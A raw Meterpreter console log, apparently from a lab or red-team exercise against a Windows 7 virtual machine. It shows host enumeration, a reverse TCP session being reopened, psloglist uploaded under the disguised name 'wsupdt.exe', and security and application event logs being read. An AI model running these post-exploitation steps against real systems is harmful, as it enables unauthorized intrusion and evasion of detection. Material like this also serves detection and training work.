+[1m[34m[*][0m System Manufacturer:       QEMU
+[1m[34m[*][0m System Model:              Standard PC (i440FX + PIIX, 1996)
+[1m[34m[*][0m System Type:               x64-based PC
+[1m[34m[*][0m Processor(s):              1 Processor(s) Installed.
+[1m[34m[*][0m                            [01]: Intel64 Family 15 Model 6 Stepping 1 GenuineIntel ~2261 Mhz
+[1m[34m[*][0m BIOS Version:              SeaBIOS rel-1.10.2-0-g5f4c7b1-prebuilt.qemu-project.org, 4/1/2014
+[1m[34m[*][0m Windows Directory:         C:\Windows
+[1m[34m[*][0m System Directory:          C:\Windows\system32
+[1m[34m[*][0m Boot Device:               \Device\HarddiskVolume1
+[1m[34m[*][0m System Locale:             en-us;English (United States)
+[1m[34m[*][0m Input Locale:              en-us;English (United States)
+[1m[34m[*][0m Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+[1m[34m[*][0m Total Physical Memory:     2,047 MB
+[1m[34m[*][0m Available Physical Memory: 548 MB
+[1m[34m[*][0m Virtual Memory: Max Size:  4,095 MB
+[1m[34m[*][0m Virtual Memory: Available: 2,664 MB
+[1m[34m[*][0m Virtual Memory: In Use:    1,431 MB
+[1m[34m[*][0m Page File Location(s):     C:\pagefile.sys
+[1m[34m[*][0m Domain:                    starwars.home
+[1m[34m[*][0m Logon Server:              \\WIN2K8DC
+[1m[34m[*][0m Hotfix(s):                 N/A
+[1m[34m[*][0m Network Card(s):           1 NIC(s) Installed.
+[1m[34m[*][0m                            [01]: Intel(R) PRO/1000 MT Network Connection
+[1m[34m[*][0m                                  Connection Name: Local Area Connection 2
+[1m[34m[*][0m                                  DHCP Enabled:    No
+[1m[34m[*][0m                                  IP address(es)
+[1m[34m[*][0m                                  [01]: 10.10.100.77
+[1m[34m[*][0m                                  [02]: fe80::c1b8:c491:905d:a392
+[4mmeterpreter[0m > ipconfig
+[0m
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 12
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:a0a:644d
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 13
+============
+Name         : Teredo Tunneling Pseudo-Interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::100:7f:fffe
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+Interface 18
+============
+Name         : Intel(R) PRO/1000 MT Network Connection #2
+Hardware MAC : 1e:14:5a:79:46:68
+MTU          : 1500
+IPv4 Address : 10.10.100.77
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::c1b8:c491:905d:a392
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+[4mmeterpreter[0m > run multicommand -cl "cmd /c ipconfig /all"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c ipconfig /all
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c ipconfig /all
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m Windows IP Configuration
+[1m[34m[*][0m 
+[1m[34m[*][0m    Host Name . . . . . . . . . . . . : SBWin7
+[1m[34m[*][0m    Primary Dns Suffix  . . . . . . . : starwars.home
+[1m[34m[*][0m    Node Type . . . . . . . . . . . . : Broadcast
+[1m[34m[*][0m    IP Routing Enabled. . . . . . . . : No
+[1m[34m[*][0m    WINS Proxy Enabled. . . . . . . . : No
+[1m[34m[*][0m    DNS Suffix Search List. . . . . . : starwars.home
+[1m[34m[*][0m 
+[1m[34m[*][0m Ethernet adapter Local Area Connection 2:
+[1m[34m[*][0m 
+[1m[34m[*][0m    Connection-specific DNS Suffix  . : 
+[1m[34m[*][0m    Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
+[1m[34m[*][0m    Physical Address. . . . . . . . . : 1E-14-5A-79-46-68
+[1m[34m[*][0m    DHCP Enabled. . . . . . . . . . . : No
+[1m[34m[*][0m    Autoconfiguration Enabled . . . . : Yes
+[1m[34m[*][0m    Link-local IPv6 Address . . . . . : fe80::c1b8:c491:905d:a392%18(Preferred) 
+[1m[34m[*][0m    IPv4 Address. . . . . . . . . . . : 10.10.100.77(Preferred) 
+[1m[34m[*][0m    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+[1m[34m[*][0m    Default Gateway . . . . . . . . . : 10.10.100.1
+[1m[34m[*][0m    DHCPv6 IAID . . . . . . . . . . . : 354292826
+[1m[34m[*][0m    DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-1A-D0-EE-8C-00-0C-29-E4-DC-2C
+[1m[34m[*][0m    DNS Servers . . . . . . . . . . . : 10.10.100.8
+[1m[34m[*][0m                                        8.8.8.8
+[1m[34m[*][0m    NetBIOS over Tcpip. . . . . . . . : Enabled
+[1m[34m[*][0m 
+[1m[34m[*][0m Tunnel adapter isatap.{989C6EB2-1149-4C73-B30F-360648E9A6DD}:
+[1m[34m[*][0m 
+[1m[34m[*][0m    Media State . . . . . . . . . . . : Media disconnected
+[1m[34m[*][0m    Connection-specific DNS Suffix  . : 
+[1m[34m[*][0m    Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+[1m[34m[*][0m    Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+[1m[34m[*][0m    DHCP Enabled. . . . . . . . . . . : No
+[1m[34m[*][0m    Autoconfiguration Enabled . . . . : Yes
+[1m[34m[*][0m 
+[1m[34m[*][0m Tunnel adapter Local Area Connection* 11:
+[1m[34m[*][0m 
+[1m[34m[*][0m    Media State . . . . . . . . . . . : Media disconnected
+[1m[34m[*][0m    Connection-specific DNS Suffix  . : 
+[1m[34m[*][0m    Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+[1m[34m[*][0m    Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+[1m[34m[*][0m    DHCP Enabled. . . . . . . . . . . : No
+[1m[34m[*][0m    Autoconfiguration Enabled . . . . : Yes
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                      Arch  Session  User                          Path
+ ---   ----  ----                      ----  -------  ----                          ----
+ 0     0     [System Process]                                                       
+ 4     0     System                    x64   0                                      
+ 252   4     smss.exe                  x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 288   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 316   468   SeaPort.EXE               x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Microsoft\BingBar\7.1.355.0\SeaPort.exe
+ 324   316   csrss.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 372   364   csrss.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 380   316   wininit.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 408   364   winlogon.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 468   380   services.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 476   380   lsass.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 484   380   lsm.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 572   576   unsecapp.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\unsecapp.exe
+ 576   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 648   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 724   408   LogonUI.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 740   936   winlogon.exe              x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 776   1684  powershell.exe            x64   2        STARWARS\administrator        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 848   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 884   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 908   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 960   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1092  936   csrss.exe                 x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 1100  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1268  468   wmpnetwk.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
+ 1440  468   SearchIndexer.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 1580  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1600  2944  cmd.exe                   x64   2        STARWARS\administrator        C:\Windows\System32\cmd.exe
+ 1660  468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1680  1092  conhost.exe               x64   2        STARWARS\administrator        C:\Windows\system32\conhost.exe
+ 1684  2692  ConEmuC64.exe             x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu\ConEmuC64.exe
+ 1852  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 1968  468   spoolsv.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1988  468   TrustedInstaller.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+ 2080  468   taskhost.exe              x64   2        STARWARS\administrator        C:\Windows\system32\taskhost.exe
+ 2228  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 2284  960   rdpclip.exe               x64   2        STARWARS\administrator        C:\Windows\system32\rdpclip.exe
+ 2292  2508  mmc.exe                   x64   2        STARWARS\administrator        C:\Windows\system32\mmc.exe
+ 2364  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 2368  2936  GoogleCrashHandler64.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler64.exe
+ 2400  2508  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 2408  2936  GoogleCrashHandler.exe    x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler.exe
+ 2420  884   dwm.exe                   x64   2        STARWARS\administrator        C:\Windows\system32\Dwm.exe
+ 2508  2400  explorer.exe              x64   2        STARWARS\administrator        C:\Windows\Explorer.EXE
+ 2572  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 2628  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 2692  2508  ConEmu64.exe              x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu64.exe
+ 2700  3960  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 2764  2696  hpwuschd2.exe             x86   2        STARWARS\administrator        C:\Program Files (x86)\HP\HP Software Update\hpwuschd2.exe
+ 2812  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 2944  2692  ConEmuC64.exe             x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu\ConEmuC64.exe
+ 3048  576   WmiPrvSE.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
+ 3052  576   WmiPrvSE.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\wbem\wmiprvse.exe
+ 3552  2400  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 3604  468   AVGSvc.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\AVGSvc.exe
+ 3684  468   winlogbeat.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\winlogbeat\winlogbeat.exe
+ 3960  2508  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 3988  1092  conhost.exe               x64   2        STARWARS\administrator        C:\Windows\system32\conhost.exe
+ 4128  908   taskeng.exe               x64   2        STARWARS\administrator        C:\Windows\system32\taskeng.exe
+ 4740  468   aswidsagent.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\aswidsagent.exe
+ 4812  2508  payload.exe               x64   2        STARWARS\administrator        C:\payload.exe
+
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > upload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"
+[0m[1m[34m[*][0m uploading  : /tools/utilities/sysinternals/psloglist.exe -> c:/windows/temp/wsupdt.exe
+[1m[31m[-][0m Error running command upload: Interrupt 
+[4mmeterpreter[0m > upload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"
+[0m
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 1 closed.  Reason: Died
+[1m[31m[-][0m Error running command upload: Rex::TimeoutError Operation timed out.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> upload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cps[Krun multicommand -cl "cmd /c ipconfig /all"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cipconfig[Krun multicommand -cl "systeminfo"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csysinfo[K[Pgetuidpidlocaltime[P[P[P[P[P[Prun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:15091 
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 2 opened (10.10.20.151:15091 -> 10.10.100.77:57806) at 2019-04-05 17:31:15 -0400
+[0m[0m
+[0m[4mmeterpreter[0m > upload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"
+[0m[1m[34m[*][0m uploading  : /tools/utilities/sysinternals/psloglist.exe -> c:/windows/temp/wsupdt.exe
+[1m[34m[*][0m Uploaded 434.55 KiB of 434.55 KiB (100.0%): /tools/utilities/sysinternals/psloglist.exe -> c:/windows/temp/wsupdt.exe
+[1m[34m[*][0m uploaded   : /tools/utilities/sysinternals/psloglist.exe -> c:/windows/temp/wsupdt.exe
+[4mmeterpreter[0m > cd c:\windows\\temp
+[0m[4mmeterpreter[0m > run multicommand -cl "cmd /c wsupdt.exe -h /accepteula"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c wsupdt.exe -h /accepteula
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c wsupdt.exe -h /accepteula
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m PsLoglist v2.81 - local and remote event log viewer
+[1m[34m[*][0m Copyright (C) 2000-2019 Mark Russinovich
+[1m[34m[*][0m Sysinternals - www.sysinternals.com
+[1m[34m[*][0m 
+[1m[34m[*][0m PsLogList dumps event logs on a local or remote NT system.
+[1m[34m[*][0m 
+[1m[34m[*][0m Usage: psloglist [\\computer[,computer2[,...] | @file] [-u username [-p password]]] [-s [-t delimiter]] [-m #|-n #|-d #|-h #|-w][-c][-x][-r][-a mm/dd/yy][-b mm/dd/yy] [-f filter] [-i ID,[ID,...]] | -e ID,[ID,...]] [-o event source[,event source[,...]]] [-q event source[,event source[,...]]] [[-g|-l] event log file] <event log>
+[1m[34m[*][0m      @file     Psloglist will execute the command on each of the computers
+[1m[34m[*][0m                listed in the file.
+[1m[34m[*][0m      -a        Dump records timestamped after specified date.
+[1m[34m[*][0m      -b        Dump records timestamped before specified date.
+[1m[34m[*][0m      -c        Clear event log after displaying.
+[1m[34m[*][0m      -d        Only display records from previous n days.
+[1m[34m[*][0m      -e        Exclude events with the specified ID or IDs (up to 10).
+[1m[34m[*][0m      -f        Filter event types, using starting letter
+[1m[34m[*][0m                (e.g. "-f we" to filter warnings and errors).
+[1m[34m[*][0m      -g        Export an event log as an evt file.
+[1m[34m[*][0m      -h        Only display records from previous n hours.
+[1m[34m[*][0m      -i        Show only events with the specified ID or IDs (up to 10).
+[1m[34m[*][0m      -l        Dump the contents of the specified saved event log file.
+[1m[34m[*][0m      -m        Only display records from previous n minutes.
+[1m[34m[*][0m      -n        Only display n most recent records.
+[1m[34m[*][0m      -o        Show only records from the specified event source or sources
+[1m[34m[*][0m                (e.g. "-o cdrom"). Append '*' to specify substring match.
+[1m[34m[*][0m      -p        Specifies password for user name.
+[1m[34m[*][0m      -q        Omit records from the specified event source or sources
+[1m[34m[*][0m                (e.g. "-q cdrom").
+[1m[34m[*][0m                Append '*' to specify substring match.
+[1m[34m[*][0m      -r        Dump log from least recent to most recent.
+[1m[34m[*][0m      -s        Records are listed on one line each with delimited
+[1m[34m[*][0m                fields, which is convenient for string searches.
+[1m[34m[*][0m      -t        The default delimiter for the -s option is a comma,
+[1m[34m[*][0m                but can be overriden with the specified character. Use "\t"
+[1m[34m[*][0m                to specify tab.
+[1m[34m[*][0m      -u        Specifies optional user name for login to
+[1m[34m[*][0m                remote computer.
+[1m[34m[*][0m      -w        Wait for new events, dumping them as they generate (local system
+[1m[34m[*][0m                only.)
+[1m[34m[*][0m      -x        Dump extended data.
+[1m[34m[*][0m      -z        List event logs registered on specified system.
+[1m[34m[*][0m      -nobanner Do not display the startup banner and copyright message.
+[1m[34m[*][0m      eventlog  Specifies event log to dump. Default is system. If the
+[1m[34m[*][0m                -l switch is present then the event log name specifies
+[1m[34m[*][0m                how to interpret the event log file.
+[1m[34m[*][0m 
+[4mmeterpreter[0m > run multicommand -cl "cmd /c wsupdt.exe -m 10 security"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c wsupdt.exe -m 10 security
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c wsupdt.exe -m 10 security
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m PsLoglist v2.81 - local and remote event log viewer
+[1m[34m[*][0m Copyright (C) 2000-2019 Mark Russinovich
+[1m[34m[*][0m Sysinternals - www.sysinternals.com
+[1m[34m[*][0m 
+[1m[34m[*][0m Security log on \\SBWIN7:
+[1m[34m[*][0m [8855] Microsoft-Windows-Security-Auditing
+[1m[34m[*][0m    Type:     SUCCESS AUDIT 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:54 PM   ID:       4672 
+[1m[34m[*][0m Special privileges assigned to new logon.
+[1m[34m[*][0m   Subject:
+[1m[34m[*][0m 	Security ID:		S-1-5-18
+[1m[34m[*][0m 	Account Name:		SYSTEM
+[1m[34m[*][0m 	Account Domain:		NT AUTHORITY
+[1m[34m[*][0m 	Logon ID:		0x3e7
+[1m[34m[*][0m   Privileges:		SeAssignPrimaryTokenPrivilege
+[1m[34m[*][0m 			SeTcbPrivilege
+[1m[34m[*][0m 			SeSecurityPrivilege
+[1m[34m[*][0m 			SeTakeOwnershipPrivilege
+[1m[34m[*][0m 			SeLoadDriverPrivilege
+[1m[34m[*][0m 			SeBackupPrivilege
+[1m[34m[*][0m 			SeRestorePrivilege
+[1m[34m[*][0m 			SeDebugPrivilege
+[1m[34m[*][0m 			SeAuditPrivilege
+[1m[34m[*][0m 			SeSystemEnvironmentPrivilege
+[1m[34m[*][0m 			SeImpersonatePrivilege
+[1m[34m[*][0m 
+[1m[34m[*][0m [8854] Microsoft-Windows-Security-Auditing
+[1m[34m[*][0m    Type:     SUCCESS AUDIT 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:54 PM   ID:       4624 
+[1m[34m[*][0m An account was successfully logged on.
+[1m[34m[*][0m   Subject:
+[1m[34m[*][0m 	Security ID:		S-1-5-18
+[1m[34m[*][0m 	Account Name:		SBWIN7$
+[1m[34m[*][0m 	Account Domain:		STARWARS
+[1m[34m[*][0m 	Logon ID:		0x3e7
+[1m[34m[*][0m   Logon Type:			5
+[1m[34m[*][0m   New Logon:
+[1m[34m[*][0m 	Security ID:		S-1-5-18
+[1m[34m[*][0m 	Account Name:		SYSTEM
+[1m[34m[*][0m 	Account Domain:		NT AUTHORITY
+[1m[34m[*][0m 	Logon ID:		0x3e7
+[1m[34m[*][0m 	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+[1m[34m[*][0m   Process Information:
+[1m[34m[*][0m 	Process ID:		0x1d4
+[1m[34m[*][0m 	Process Name:		C:\Windows\System32\services.exe
+[1m[34m[*][0m   Network Information:
+[1m[34m[*][0m 	Workstation Name:	
+[1m[34m[*][0m 	Source Network Address:	-
+[1m[34m[*][0m 	Source Port:		-
+[1m[34m[*][0m   Detailed Authentication Information:
+[1m[34m[*][0m 	Logon Process:		Advapi  
+[1m[34m[*][0m 	Authentication Package:	Negotiate
+[1m[34m[*][0m 	Transited Services:	-
+[1m[34m[*][0m 	Package Name (NTLM only):	-
+[1m[34m[*][0m 	Key Length:		0
+[1m[34m[*][0m   This event is generated when a logon session is created. It is generated on the computer that was accessed.
+[1m[34m[*][0m   The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+[1m[34m[*][0m   The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+[1m[34m[*][0m   The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+[1m[34m[*][0m   The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+[1m[34m[*][0m   The authentication information fields provide detailed information about this specific logon request.
+[1m[34m[*][0m 	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+[1m[34m[*][0m 	- Transited services indicate which intermediate services have participated in this logon request.
+[1m[34m[*][0m 	- Package name indicates which sub-protocol was used among the NTLM protocols.
+[1m[34m[*][0m 	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
+[1m[34m[*][0m 
+[1m[34m[*][0m [8853] Microsoft-Windows-Security-Auditing
+[1m[34m[*][0m    Type:     FAILURE AUDIT 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:01 PM   ID:       6281 
+[1m[34m[*][0m Code Integrity determined that the page hashes of an image file are not valid. The file could be improperly signed without page hashes or corrupt due to unauthorized modification. The invalid hashes could indicate a potential disk device error.
+[1m[34m[*][0m   File Name:	\Device\HarddiskVolume2\Windows\System32\l3codeca.acm	
+[1m[34m[*][0m 
+[1m[34m[*][0m [8852] Microsoft-Windows-Security-Auditing
+[1m[34m[*][0m    Type:     SUCCESS AUDIT 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:24:06 PM   ID:       4672 
+[1m[34m[*][0m Special privileges assigned to new logon.
+[1m[34m[*][0m   Subject:
+[1m[34m[*][0m 	Security ID:		S-1-5-18
+[1m[34m[*][0m 	Account Name:		SYSTEM
+[1m[34m[*][0m 	Account Domain:		NT AUTHORITY
+[1m[34m[*][0m 	Logon ID:		0x3e7
+[1m[34m[*][0m   Privileges:		SeAssignPrimaryTokenPrivilege
+[1m[34m[*][0m 			SeTcbPrivilege
+[1m[34m[*][0m 			SeSecurityPrivilege
+[1m[34m[*][0m 			SeTakeOwnershipPrivilege
+[1m[34m[*][0m 			SeLoadDriverPrivilege
+[1m[34m[*][0m 			SeBackupPrivilege
+[1m[34m[*][0m 			SeRestorePrivilege
+[1m[34m[*][0m 			SeDebugPrivilege
+[1m[34m[*][0m 			SeAuditPrivilege
+[1m[34m[*][0m 			SeSystemEnvironmentPrivilege
+[1m[34m[*][0m 			SeImpersonatePrivilege
+[1m[34m[*][0m 
+[1m[34m[*][0m [8851] Microsoft-Windows-Security-Auditing
+[1m[34m[*][0m    Type:     SUCCESS AUDIT 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:24:06 PM   ID:       4624 
+[1m[34m[*][0m An account was successfully logged on.
+[1m[34m[*][0m   Subject:
+[1m[34m[*][0m 	Security ID:		S-1-5-18
+[1m[34m[*][0m 	Account Name:		SBWIN7$
+[1m[34m[*][0m 	Account Domain:		STARWARS
+[1m[34m[*][0m 	Logon ID:		0x3e7
+[1m[34m[*][0m   Logon Type:			5
+[1m[34m[*][0m   New Logon:
+[1m[34m[*][0m 	Security ID:		S-1-5-18
+[1m[34m[*][0m 	Account Name:		SYSTEM
+[1m[34m[*][0m 	Account Domain:		NT AUTHORITY
+[1m[34m[*][0m 	Logon ID:		0x3e7
+[1m[34m[*][0m 	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+[1m[34m[*][0m   Process Information:
+[1m[34m[*][0m 	Process ID:		0x1d4
+[1m[34m[*][0m 	Process Name:		C:\Windows\System32\services.exe
+[1m[34m[*][0m   Network Information:
+[1m[34m[*][0m 	Workstation Name:	
+[1m[34m[*][0m 	Source Network Address:	-
+[1m[34m[*][0m 	Source Port:		-
+[1m[34m[*][0m   Detailed Authentication Information:
+[1m[34m[*][0m 	Logon Process:		Advapi  
+[1m[34m[*][0m 	Authentication Package:	Negotiate
+[1m[34m[*][0m 	Transited Services:	-
+[1m[34m[*][0m 	Package Name (NTLM only):	-
+[1m[34m[*][0m 	Key Length:		0
+[1m[34m[*][0m   This event is generated when a logon session is created. It is generated on the computer that was accessed.
+[1m[34m[*][0m   The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+[1m[34m[*][0m   The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+[1m[34m[*][0m   The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+[1m[34m[*][0m   The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+[1m[34m[*][0m   The authentication information fields provide detailed information about this specific logon request.
+[1m[34m[*][0m 	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+[1m[34m[*][0m 	- Transited services indicate which intermediate services have participated in this logon request.
+[1m[34m[*][0m 	- Package name indicates which sub-protocol was used among the NTLM protocols.
+[1m[34m[*][0m 	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
+[1m[34m[*][0m 
+[4mmeterpreter[0m > run multicommand -cl "cmd /c wsupdt.exe -m 10 application"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c wsupdt.exe -m 10 application
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c wsupdt.exe -m 10 application
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m PsLoglist v2.81 - local and remote event log viewer
+[1m[34m[*][0m Copyright (C) 2000-2019 Mark Russinovich
+[1m[34m[*][0m Sysinternals - www.sysinternals.com
+[1m[34m[*][0m 
+[1m[34m[*][0m Application log on \\SBWIN7:
+[1m[34m[*][0m [3522] Windows Error Reporting
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:59 PM   ID:       1001 
+[1m[34m[*][0m Fault bucket , type 0
+[1m[34m[*][0m Event Name: APPCRASH
+[1m[34m[*][0m Response: Not available
+[1m[34m[*][0m Cab Id: 0
+[1m[34m[*][0m   Problem signature:
+[1m[34m[*][0m P1: payload.exe
+[1m[34m[*][0m P2: 0.0.0.0
+[1m[34m[*][0m P3: 4bc63c7d
+[1m[34m[*][0m P4: unknown
+[1m[34m[*][0m P5: 0.0.0.0
+[1m[34m[*][0m P6: 00000000
+[1m[34m[*][0m P7: c0000005
+[1m[34m[*][0m P8: 0000000000358692
+[1m[34m[*][0m P9: 
+[1m[34m[*][0m P10: 
+[1m[34m[*][0m   Attached files:
+[1m[34m[*][0m   These files may be available here:
+[1m[34m[*][0m C:\Users\administrator\AppData\Local\Microsoft\Windows\WER\ReportArchive\AppCrash_payload.exe_676ce745ac257fcd658fcefeac61cbba121891e1_201a0c00
+[1m[34m[*][0m   Analysis symbol: 
